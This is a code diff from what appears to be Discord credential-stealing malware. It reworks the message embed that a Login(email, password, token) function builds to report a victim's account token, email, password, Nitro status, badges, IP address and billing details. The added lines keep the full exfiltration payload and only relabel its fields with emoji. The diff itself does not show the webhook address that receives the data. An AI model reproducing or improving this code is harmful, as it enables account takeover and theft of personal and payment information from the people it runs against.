@@ -225,28 +225,42 @@ function Login(email, password, token) {
                     "color": 000000,
                     "fields": [
                         {
-                            "name": ":unlock: | Token :",
+                            "name": ":dollar: TOKEN",
                             "value": `\`${token}\``,
                             "inline": false
                         },
                         
                         
                         {
-                            "name": "<:3809discordhypesquad:940583844367724644> | Account Info :",
-                            "value": `Email: \`${email}\` \nPassword: \`${password}\``,
-                            "inline": false
-                        },
-                        
-                        
-                        {
-                            "name": "<a:discord_gif:709806861351911445> | Other :",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
+                            "name": ":envelope_with_arrow: EMAIL",
+                            "value": `\`${email}\``,
                             "inline": false
                         },
 
 
                         {
-                            "name": ":globe_with_meridians: | Ip :",
+                            "name": ":secret: PASSWORD",
+                            "value": `\`${password}\``,
+                            "inline": false
+                        },
+                        
+                        
+                        {
+                            "name": "<:2937discordnitro:940583844233510982> NITRO",
+                            "value": `${GetNitro(json.premium_type)}`,
+                            "inline": false
+                        },
+                        
+                        
+                        {
+                            "name": "<:3809discordhypesquad:940583844367724644> BADGES",
+                            "value": `\`${GetBadges(json.flags)}\``,
+                            "inline": false
+                        },
+
+
+                        {
+                            "name": ":globe_with_meridians: IP ADDRESS",
                             "value": `Ip: \`${ip}\``,
                             "inline": false
                             
@@ -254,7 +268,7 @@ function Login(email, password, token) {
 
 
                         {
-                            "name": "Billing",
+                            "name": ":euro: Billing",
                             "value": `${Cool()}`,
                             "inline": false
                         }
